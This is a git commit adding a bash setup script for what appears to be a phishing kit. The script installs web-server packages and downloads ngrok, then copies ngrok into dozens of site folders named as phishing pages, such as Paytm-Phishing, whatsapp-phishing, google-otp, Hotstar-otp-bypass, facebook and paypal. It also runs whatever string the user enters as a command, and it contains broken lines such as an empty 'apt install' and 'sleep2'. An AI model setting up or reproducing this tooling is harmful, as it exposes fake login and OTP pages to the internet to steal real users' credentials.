24e9599b12113e12fa7e5eed946d57a78df21381
NISscan2001 <71102819+NISscan@users.noreply.github.com>
2020-09-10 22:20:07 +0000

    Add files via upload

---
+++ Android-Setup.sh
@@ -0,0 +1,79 @@
+#!/bin/bash
+echo ""
+clear
+echo ""
+echo ""
+echo ""
+echo ""
+echo -e $'\e[1;91m[\e[0m\e[1;77m+\e[0m\e[1;91m]\e[0m\e[1;96m!!! DUDE PLEASE ENTER NGROK !!! \e[0m'
+sleep 2
+clear
+echo ""
+echo ""
+echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
+echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!         DOWNLOAD REQUIREMENTS         !!\e[0m'
+echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
+echo ""
+termux-setup-storage
+sudo apt-get install apache2 -y
+apt install 
+apt install ruby -y
+apt install php -y
+apt install jq -y
+apt install tail -y
+apt install curl -y
+apt install zip -y
+pkg install wget -y
+pkg install ruby -y
+pkg install gem -y
+gem install lolcat
+clear
+wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip --no-check-certificate
+unzip ngrok-stable-linux-arm.zip
+cp -R ngrok NISARG  sites/github/
+cp -R ngrok NISARG  sites/Hotstar-otp-bypass/
+cp -R ngrok NISARG sites/instagram/
+cp -R ngrok NISARG sites/Linkedin/
+cp -R ngrok NISARG sites/Netflix/
+cp -R ngrok NISARG sites/Paytm-Phishing/paytm/
+cp -R ngrok NISARG sites/Paytm-Phishing/signup/
+cp -R ngrok NISARG sites/spotify/
+cp -R ngrok NISARG sites/whatsapp-phishing/
+cp -R ngrok NISARG sites/facebook/
+cp -R ngrok NISARG sites/google-otp/
+cp -R ngrok NISARG sites/instafollow/
+cp -R ngrok NISARG sites/ipfinder/
+cp -R ngrok NISARG sites/ola-otpbypass/
+cp -R ngrok NISARG sites/UberEats-Phishing/
+cp -R ngrok NISARG sites/Zomato-Phishing/
+cp -R ngrok NISARG sites/amazonsign/
+cp -R ngrok NISARG sites/tiktok/
+cp -R ngrok NISARG sites/phonepay/
+cp -R ngrok NISARG sites/paypal/
+cp -R ngrok NISARG sites/telegram/
+cp -R ngrok NISARG sites/twitter/
+cp -R ngrok NISARG sites/flipcart/
+cp -R ngrok NISARG sites/wordpress/
+cp -R ngrok NISARG sites/snapchat/
+cp -R ngrok NISARG sites/protonmail/
+cp -R ngrok NISARG sites/stackoverflow/
+cp -R ngrok NISARG sites/ebay/
+cp -R ngrok NISARG sites/twitch/
+cp -R ngrok NISARG sites/ajio/
+cp -R ngrok NISARG sites/cryptocurrency/
+cp -R ngrok NISARG sites/mobikwik/
+cp -R ngrok NISARG sites/pinterest/
+chmod 7777 NISscan.sh
+clear
+echo ""
+echo -e $'\e[1;91m[\e[0m\e[1;33m *** \e[0m\e[1;96m]\e[0m\e[1;91m KEEP IN MIND YOU HAVE TO ENTER  \e[1;33m[ *** ]\e[0m'
+echo ""
+read -p $'\e[1;91m[\e[0m\e[1;77m+\e[0m\e[1;91m]\e[0m\e[1;96m Enter The Ngrok Token [Ex. ./ngrok authtoken 1Y7IU ] : \e[0m' token
+$token
+sleep2
+clear
+echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;96m\e[0m\e[1;92m  ---------------------------------   \e[1;91m\e[0m'
+echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m !!    Installation Successfull   !!  \e[1;91m\e[0m'
+echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;96m\e[0m\e[1;92m  ---------------------------------   \e[1;91m\e[0m'
+sleep 4
+clear
